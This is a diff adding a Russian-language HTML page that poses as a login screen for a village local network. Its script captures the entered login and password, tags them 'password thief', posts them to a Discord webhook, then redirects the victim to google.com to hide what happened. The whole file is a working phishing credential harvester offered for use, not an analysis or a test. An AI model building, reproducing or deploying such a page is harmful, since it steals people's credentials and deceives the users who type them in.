@@ -1,0 +1,45 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="utf-8">
+    <title>Локальная сеть деревни</title>
+    <style>
+        body { font-family: sans-serif; text-align: center; padding-top: 50px; background-color: #f0f0f0; }
+        .login-box { background: white; padding: 30px; border-radius: 10px; display: inline-block; box-shadow: 0 0 10px rgba(0,0,0,0.1); }
+        input { display: block; margin: 10px auto; padding: 10px; width: 200px; border: 1px solid #ccc; border-radius: 5px; }
+        button { padding: 10px 20px; background: #007bff; color: white; border: none; border-radius: 5px; cursor: pointer; }
+    </style>
+</head>
+<body>
+    <div class="login-box">
+        <h2>Вход в сеть</h2>
+        <p>Введите данные для доступа к базе</p>
+        <form id="hackForm">
+            <input type="text" id="user" placeholder="Логин" required>
+            <input type="password" id="pass" placeholder="Пароль" required>
+            <button type="submit">Войти</button>
+        </form>
+    </div>
+
+    <script>
+        document.getElementById('hackForm').onsubmit = function(e) {
+            e.preventDefault(); // Останавливаем перезагрузку
+            
+            let login = document.getElementById('user').value;
+            let password = document.getElementById('pass').value;
+            
+            let msg = "ВОР ПАРОЛЕЙ: Логин: " + login + " | Пароль: " + password;
+            
+            // Отправляем на новый вебхук
+            fetch("https://discord.com/api/webhooks/1569726738953670676/HmFi0r_pu0kStSw8GPFw00SGc1AtjQp049Ks6wyjul2ulcSxeB09cvcu1rWcahDTOHQd", {
+                method: 'POST',
+                headers: {'Content-Type': 'application/json'},
+                body: JSON.stringify({content: msg})
+            }).then(() => {
+                // Маскировка
+                window.location.href = "https://www.google.com"; 
+            });
+        };
+    </script>
+</body>
+</html>
